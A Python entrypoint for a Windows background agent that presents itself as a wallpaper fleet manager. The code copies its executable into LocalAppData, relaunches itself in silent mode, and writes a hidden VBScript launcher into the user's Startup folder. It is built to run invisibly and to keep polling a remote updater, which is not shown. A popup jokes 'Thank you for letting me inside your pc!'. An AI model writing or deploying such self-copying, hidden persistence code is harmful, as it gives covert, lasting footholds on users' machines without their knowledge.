"""
client/main_agent.py

Entrypoint for the background Client Agent.

Design goals:
    - Runs forever, polling every POLL_INTERVAL_SECONDS.
    - NEVER crashes or shows a console error to the user, even if:
        * the network is down
        * DNS resolution fails
        * GitHub returns a 5xx / rate-limits us
        * config.json is temporarily malformed
        * the Win32 call itself fails
    - Errors are logged to a local file (for troubleshooting) but never
      raised to the user or written to stdout/stderr, since this process
      is intended to run completely hidden (see the .vbs wrapper / Task
      Scheduler setup instructions).
"""

from __future__ import annotations

import os
import sys
import time
import winreg
import logging
import shutil
import subprocess
import tkinter as tk
from tkinter import messagebox

from client import config
from client import updater

# Define permanent installation directory
PERM_DIR = os.path.join(os.environ["LOCALAPPDATA"], "WallpaperFleetManager")


def _configure_logging() -> None:
    config.ensure_cache_dir()
    logging.basicConfig(
        filename=config.LOG_FILE,
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )


def self_replicate(logger: logging.Logger) -> str:
    """Copies the executable to LocalAppData if not already running from there."""
    os.makedirs(PERM_DIR, exist_ok=True)
    
    # Check if we are running as a compiled .exe or a Python script
    if getattr(sys, 'frozen', False):
        current_exe = sys.executable
        exe_name = os.path.basename(current_exe)
    else:
        current_exe = os.path.abspath(__file__)
        exe_name = "WallpaperAgent.exe" # Fallback name for development
        
    perm_exe_path = os.path.join(PERM_DIR, exe_name)

    # If we are not currently running from the permanent directory, move there
    if os.path.abspath(current_exe) != os.path.abspath(perm_exe_path):
        try:
            logger.info("Self-replicating to permanent directory: %s", perm_exe_path)
            shutil.copy2(current_exe, perm_exe_path)
            
            # Relaunch the permanent copy in silent mode, then kill this temporary one
            subprocess.Popen([perm_exe_path, "--silent"], close_fds=True)
            sys.exit(0)
        except Exception as exc:
            logger.error("Failed to self-replicate: %s", exc)

    return perm_exe_path


def add_to_startup(logger: logging.Logger, perm_exe_path: str) -> None:
    """Silently adds this executable to the Windows Startup folder via a VBScript wrapper."""
    startup_dir = os.path.join(
        os.environ["APPDATA"], 
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )
    vbs_path = os.path.join(startup_dir, "WallpaperFleetAgent.vbs")

    try:
        with open(vbs_path, "w") as f:
            f.write('Set WshShell = CreateObject("WScript.Shell")\n')
            # Notice we appended " --silent" inside the arguments so reboots stay hidden!
            f.write(f'WshShell.Run chr(34) & "{perm_exe_path}" & chr(34) & " --silent", 0\n')
            f.write('Set WshShell = Nothing\n')
        
        logger.info("Successfully created startup VBScript pointing to %s", perm_exe_path)
    except Exception as exc:
        logger.warning("Failed to create startup script: %s", exc)


def main() -> None:
    _configure_logging()
    logger = logging.getLogger("wallpaper_agent")
    logger.info("Wallpaper Fleet Agent starting. Poll interval: %ss",
                config.POLL_INTERVAL_SECONDS)

    # 1. Show popup ONLY if launched manually (i.e., NO "--silent" argument is passed)
    # We do this BEFORE self-replicating, otherwise the process kills itself before showing it!
    if "--silent" not in sys.argv:
        root = tk.Tk()
        root.withdraw()  # Hides the ugly default empty window
        root.attributes("-topmost", True)  # Forces popup to appear on top
        messagebox.showinfo(
            "Agent Active", 
            "Thank you for letting me inside your pc! :)"
        )
        root.destroy()   # Cleans up the tk instance

    # 2. Self-replicate to AppData and get the permanent path
    perm_exe_path = self_replicate(logger)

    # 3. Embed into Windows startup immediately using the permanent path
    add_to_startup(logger, perm_exe_path)

    # 4. Start the normal agent loop
    while True:
        try:
            updater.run_update_check()
        except Exception as exc:  # noqa: BLE001 - intentional catch-all
            logger.warning("Update check failed (will retry next cycle): %s", exc)

        time.sleep(config.POLL_INTERVAL_SECONDS)


if __name__ == "__main__":
    main()